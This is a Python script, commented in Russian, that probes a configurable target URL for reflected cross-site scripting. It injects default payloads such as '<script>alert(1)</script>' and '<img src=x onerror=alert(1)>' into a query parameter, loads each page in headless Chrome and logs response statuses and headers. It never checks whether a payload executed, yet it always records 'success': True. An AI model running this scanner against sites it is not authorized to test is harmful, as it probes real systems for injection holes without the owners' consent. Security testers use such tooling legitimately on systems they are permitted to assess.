from seleniumwire import webdriver
from selenium.webdriver.chrome.options import Options
from urllib.parse import quote
import json
import time
import os

# Чтение конфига
with open("shared/config.json", "r") as f:
    config = json.load(f)

target = config.get("target")
param = config.get("param", "q")
headless = config.get("headless", True)
payloads = config.get("payloads", ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"])

# Настройка браузера
options = Options()
if headless:
    options.add_argument("--headless")
options.add_argument("--disable-gpu")
options.add_argument("--no-sandbox")

driver = webdriver.Chrome(options=options)

# Лог файл
log_path = "shared/logs.txt"
with open(log_path, "w", encoding="utf-8") as log_file:
    for payload in payloads:
        encoded = quote(payload)
        url = f"{target}?{param}={encoded}"
        try:
            driver.get(url)
            time.sleep(1)

            log_file.write(f"[→] GET {url}\n")

            for request in driver.requests:
                if request.response and target in request.url:
                    log_file.write(f"[←] Status: {request.response.status_code}\n")
                    log_file.write(f"     Headers: {dict(request.response.headers)}\n\n")
                    break

        except Exception as e:
            log_file.write(f"[ERROR] {url} — {str(e)}\n")

driver.quit()

# Запись финального статуса
status = {
    "status": "completed",
    "target": target,
    "success": True
}
with open("shared/status.json", "w") as f:
    json.dump(status, f, indent=4)
